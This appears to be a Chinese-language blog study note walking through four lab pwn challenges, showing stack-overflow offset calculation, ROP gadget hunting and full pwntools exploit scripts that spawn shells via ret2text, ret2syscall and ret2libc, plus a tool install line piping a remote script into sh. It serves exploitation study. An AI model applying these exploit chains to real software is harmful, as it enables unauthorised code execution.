---
layout:     post
title:    PWN——gadgets
subtitle:  gadgets
date:       2018-12-01
author:     DC
header-img: img/post-bg-re-vs-ng2.jpg
catalog: true
tags:

    - gadgets
    - pwn
---

# gadgets

主要涉及到当堆栈开启了保护的时候，我们不能够直接将shellcode覆盖到堆栈中执行，而需要利用程序其他部分的可执行的小片段来连接成最终的shellcode。此小片段就是gadgets。根据[该文章](https://www.anquanke.com/post/id/164530)进行学习

##  工具list及安装

### [checksec](https://github.com/slimm609/checksec.sh)

------  该工具专门用来检测程序中受保护的情况

```
checksec 为编译好 文件 
可使用   sudo ln –sf checksec /xxx/xxx/checksec 来链接
checksec pwn1 
[*] '/home/toor/pwn1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### [GEF](https://github.com/hugsy/gef) 

-------  工具用来辅助调试 （和gdb peda 差不多）

```
# via the install script
$ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh

# manually
$ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py
$ echo source ~/.gdbinit-gef.py >> ~/.gdbinit

$ gdb -q /path/to/my/bin
gef➤  gef help
```



### [patternLocOffset.py](https://github.com/desword/shellcode_tools)

主要用来生成特征字符串 



### [Capstone](https://github.com/aquynh/capstone)是一个反汇编框架

```
cd ~
git clone https://github.com/aquynh/capstone
cd capstone
make
make install
```

### [pwntools](https://github.com/Gallopsled/pwntools)
```
pwntools 为二进制利用基类库
cd ~
git clone https://github.com/Gallopsled/pwntools
cd pwntools
python setup.py install
```



### syscall

Syscall的函数调用规范为： execve(“/bin/sh”, 0,0);

对应的汇编代码为：

```
pop eax,   # 系统调用号载入， execve为0xb
pop ebx,     # 第一个参数， /bin/sh的string
pop ecx,  # 第二个参数，0
pop edx, # 第三个参数，0
int 0x80,  # 执行系统调用
```

### [ROPgadget Tool](https://github.com/JonathanSalwan/ROPgadget)

```
sudo pip install capstone

source code :
$ python setup.py install
$ ROPgadget
pypi install:
$ pip install ropgadget
$ ROPgadget

ROPgadget --binary ret2syscall --only 'pop|ret' | grep "eax"

```









###  题目

#### pwn1

IDA

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets((char *)&v4); //栈溢出
  printf("Maybe I will tell you next time !");
  return 0;
}
```

关键点：

1. V4 在堆栈中距离 ebp 的位置长度（32位中 ebp+4 为返回地址）
2. 找到 系统利用 rop （‘/bin/sh’）
3. 编写利用代码

解决方法：

1. 手工计算（借助gef辅助计算）/工具计算   

   手工：安装了 gef  后, gef -q  pwn1  b *0x080486AE(IDA 看地址),run ,

   可以看到：

   ```
   $esp   : 0xbffff000  →  0xbffff01c  →  0x08048329  →  "__libc_start_main"
   $ebp   : 0xbffff088  →  0x00000000   
   esp=0xbffff000
   ebp=0xbffff088
   
    0x80486a7 <main+95>        lea    eax, [esp+0x1c]
       0x80486ab <main+99>        mov    DWORD PTR [esp], eax
    →  0x80486ae <main+102>       call   0x8048460 <gets@plt>
   
   lea    eax, [esp+0x1c]
   这个地方看出 s 参数   地址为[esp+0x1c]
   s 地址为 0xbffff01c
   相对于ebp 为 6c
   6c+4 为 返回值地址  ！！！！！
   ```

   借助工具计算  patternLocOffset.py：

   其实就是污点字段追踪：生成一个特定字符串，看溢出点位置 这个 地方 他用到了  [IDA的远程调试](https://blog.csdn.net/liujiayu2/article/details/51791297/)

   通过   python patternLocOffset.py -c -l 700 -f test   生成一个 700个长度的字符串 输入进去

   查看  ebp 的位置 覆盖的数据 为 0x41366441

   通过  python patternLocOffset.py  -l 700  -s 41366441 来计算便宜位置

2. 题目上是通过 IDA alt + A 搜索字符串。。。

   ```
   .text:08048638                 jnz     short locret_8048646
   .text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
   .text:08048641                 call    _system
   ```

3. 编写pwntools

```
from pwn import *
pwn1 = process('./pwn1')
target = 0x804863a
pwn1.sendline('A' * (112) + p32(target))
pwn1.interactive()

```



### PWN2



IDA:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch][bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}
```

```
.text:08048E83                 mov     dword ptr [esp], offset aWhatDoYouPlanT ; "What do you plan to do?"
.text:08048E8A                 call    puts
.text:08048E8F                 lea     eax, [esp+1Ch]
.text:08048E93                 mov     [esp], eax
.text:08048E96                 call    gets
.text:08048E9B                 mov     eax, 0
.text:08048EA0                 leave
.text:08048EA1                 retn
```

也是通过覆盖返回地址来进行调用，只不过不能直接找到 “/bin/sh”  要自己构造系统调用



关键点：

1. v4 距离ebp 地址
2. 自己构造rop链
3. 构造pwn tools

解决：

1.手工计算

```
$esp   : 0xbffff010  →  0xbffff02c  →  0x00000003
$ebp   : 0xbffff098  →  0x08049630  →  <__libc_csu_fini+0> push ebx
$esi   : 0x0       


0x8048e8f <main+107>       lea    eax, [esp+0x1c]
    0x8048e93 <main+111>       mov    DWORD PTR [esp], eax
 →  0x8048e96 <main+114>       call   0x804f650 <gets>
   ↳   0x804f650 <gets+0>         push   edi

length:6C : 108
108+4 = 112 
```

2.构造系统调用 ROP链

```
 execve(“/bin/sh”, 0,0);

pop eax,   # 系统调用号载入， execve为0xb

ROPgadget --binary ret2syscall --only 'pop|ret' | grep "eax"
0x080bb196 : pop eax ; ret


pop ebx,     # 第一个参数， /bin/sh的string
pop ecx,  # 第二个参数，0

ROPgadget --binary pwn2 --only 'pop|ret' | grep "ecx"
0x0806eb91 : pop ecx ; pop ebx ; ret



pop edx, # 第三个参数，0

ROPgadget --binary pwn2 --only 'pop|ret' | grep "edx"
0x0806eb6a : pop edx ; ret


int 0x80,  # 执行系统调用

ROPgadget --binary pwn2 --only 'int'
Gadgets information
============================================================
0x08049421 : int 0x80


每个都有ret
ret解释：
1.
eip = [esp];
esp = esp+4;
2.
pop eip (从堆栈中持续拿数据)

"/bin/sh" 字符串：0x90be408
```

PWN 代码

```python
#!/usr/bin/env python 
from pwn import *
sh = process('./pwn2')
pop_eax_ret = 0x080bb196
pop_ecx_ebx_ret = 0x0806eb91 
pop_edx_ret = 0x0806eb6a 
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_ecx_ebx_ret, 0,binsh, pop_edx_ret,0, int_0x80])
sh.sendline(payload)
sh.interactive()
```

```
:~$ python pwn2.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process './pwn2': pid 3489
[*] Switching to interactive mode
This time, no system() and NO SHELLCODE!!!
What do you plan to do?
$ ls
\          exp1.py   pwn1      testpwn1.py    ??????  ??????
checksec      gujian    pwn2      testshellcode  ??????  ??????
checksec.sh      level1    pwn2.py   ??????         ??????
examples.desktop  level1.c  pwntools  ?????????      ??????
$  

```



### PWN3

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets((char *)&v4);
  return 0;
}


text:08048666                 call    _setvbuf
.text:0804866B                 mov     dword ptr [esp], offset s ; "RET2LIBC >_<"
.text:08048672                 call    _puts
.text:08048677                 lea     eax, [esp+1Ch]
.text:0804867B                 mov     [esp], eax      ; s
.text:0804867E                 call    _gets
.text:08048683                 mov     eax, 0
.text:08048688                 leave
.text:08048689                 retn
```



关键点：

1. s ---ebp 参数位置

2. 导入表函数地址获取，/bin/sh 字段查找

3. 编写pwn 



   解决方法：

   1.  ebp  112 

   2.  0804A114  system   地址    

   3. ```
       ROPgadget --binary pwn3 --string "/bin/sh"
       ```

      Strings information
      ============================================================
      0x08048720 : /bin/sh
      
      ```

   4. pwn编写： 

      ```
      system 调用堆栈结构:
      system_plt    add esp,4  先偏移4个字节开始栈顶
      0xadbcdadbc  pop ebx  取出esp 是的内容 放入ebx   (system函数返回地址)
      sh_addr      call system; ret； ret 指向esp -4\
      
      #!/usr/bin/env python
      from pwn import *
      
      sh = process('./pwn3')
      
      system_plt = 0x08048460
      sh_addr = 0x8048720
      payload = flat(['a' * 112, system_plt, 0xabcdabcd, sh_addr])
      sh.sendline(payload)
      
      sh.interactive()
      
      ```

      ```
      python pwn3.py 
      [!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
      [+] Starting local process './pwn3': pid 3563
      [*] Switching to interactive mode
      RET2LIBC >_<
      $ ls
      \          exp1.py   pwn1     pwn3.py
      ```





### pwn4

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch][bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("Something surprise here, but I don't think it will work.");
  printf("What do you think ?");
  gets((char *)&v4);
  return 0;
}


.text:080486AE                 call    _printf
.text:080486B3                 lea     eax, [esp+1Ch]
.text:080486B7                 mov     [esp], eax      ; s
.text:080486BA                 call    _gets

```



关键点：

1.ebp距离 112

2.system 调用位置

3./bin/sh 

4.pwn

解决方法

1.

```
$esp   : 0xbffff000  →  0xbffff01c  →  0x08048329  →  "__libc_start_main"
$ebp   : 0xbffff088  →  0x00000000

0x80486b3 <main+107>       lea    eax, [esp+0x1c]
    0x80486b7 <main+111>       mov    DWORD PTR [esp], eax
 →  0x80486ba <main+114>       call   0x8048460 <gets@plt>

108
112
```

2.

```
0804A11C  system 
```

3.

```
ROPgadget --binary pwn4 --string "sh"
Strings information
============================================================
0x08048766 : sh
以上方法为错误方法
思路应该是 构造一个gets函数来接收 /bin/sh 的字符串 

故要构造的 rop链为

gets 调用地址
ebx 为内存基址寄存器 所以 pop 内存基址 到 ebx 中
buf 地址

0804A110  gets 

 ROPgadget --binary pwn4 --only "pop|ret" |grep "ebx"
0x0804843d : pop ebx ; ret


从bss段随便找一个内存
0x804a080
```

4.

```
#!/usr/bin/env python
from pwn import *
sh = process('./pwn4')
system_plt = 0x08048490
sh_addr = 0x08048766
get_plt = 0x08048460
pop_ebx = 0x0804843d
buf = 0x804a080
payload = flat(['a' * 112,get_plt,pop_ebx,buf, system_plt, 0xabcdabcd, buf])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()

python pwn4.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process './pwn4': pid 4027
[*] Switching to interactive mode
Something surprise here, but I don't think it will work.
What do you think ?$ ls
\         examples.desktop  level1.c  pwn3 


```

